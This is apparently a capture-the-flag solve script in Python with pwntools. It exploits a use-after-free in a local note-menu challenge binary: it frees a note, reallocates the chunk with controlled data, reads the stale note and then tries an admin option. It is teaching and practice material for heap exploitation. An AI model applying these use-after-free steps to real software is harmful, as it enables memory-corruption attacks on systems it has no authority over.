#!/usr/bin/env python3

from pwn import *

# This is an advanced solve that exploits the UAF more directly
def advanced_solve():
    # Compile with debug symbols for easier exploitation
    context.log_level = 'debug'
    
    # Start the process
    p = process("./menu_pwner")
    
    # Get to the menu
    p.recvuntil(b"Choice: ")
    
    # Step 1: Add a note
    p.sendline(b"1")
    p.recvuntil(b"Note size")
    p.sendline(b"40")
    p.recvuntil(b"Note content:")
    p.sendline(b"ORIGINAL_NOTE")
    p.recvuntil(b"Choice: ")
    
    # Step 2: Get debug info to see addresses
    p.sendline(b"6")
    debug_output = p.recvuntil(b"Choice: ").decode()
    print("[DEBUG OUTPUT]")
    print(debug_output)
    
    # Step 3: Delete note (creates UAF)
    p.sendline(b"3")
    p.recvuntil(b"Note index:")
    p.sendline(b"0")
    p.recvuntil(b"Choice: ")
    
    # Step 4: Create new note in same chunk
    p.sendline(b"1")
    p.recvuntil(b"Note size")
    p.sendline(b"40")  # Same size to get same chunk
    p.recvuntil(b"Note content:")
    
    # Try to find trigger_admin address and craft payload
    # In a real scenario, you'd need to:
    # 1. Leak addresses from debug output
    # 2. Calculate trigger_admin location
    # 3. Craft ROP chain or overwrite function pointer
    
    # For now, let's just put a pattern to show control
    payload = b"CONTROLLED_DATA_" + b"X" * 24
    p.sendline(payload)
    p.recvuntil(b"Choice: ")
    
    # Step 5: Try to access the old (freed) note
    print("\n[+] Attempting UAF access...")
    p.sendline(b"4")  # View note
    p.recvuntil(b"Note index:")  
    p.sendline(b"0")  # The freed note
    
    try:
        result = p.recv(timeout=2)
        print(f"[+] UAF Result: {result}")
        
        if b"CONTROLLED_DATA" in result:
            print("[+] SUCCESS: UAF confirmed! We control the freed memory!")
            
        # Try to trigger admin mode somehow
        p.recvuntil(b"Choice: ")
        p.sendline(b"7")  # Admin panel
        admin_result = p.recv(timeout=2)
        print(f"[+] Admin attempt: {admin_result}")
        
    except:
        print("[-] Exploit attempt failed")
    
    p.close()

if __name__ == "__main__":
    advanced_solve()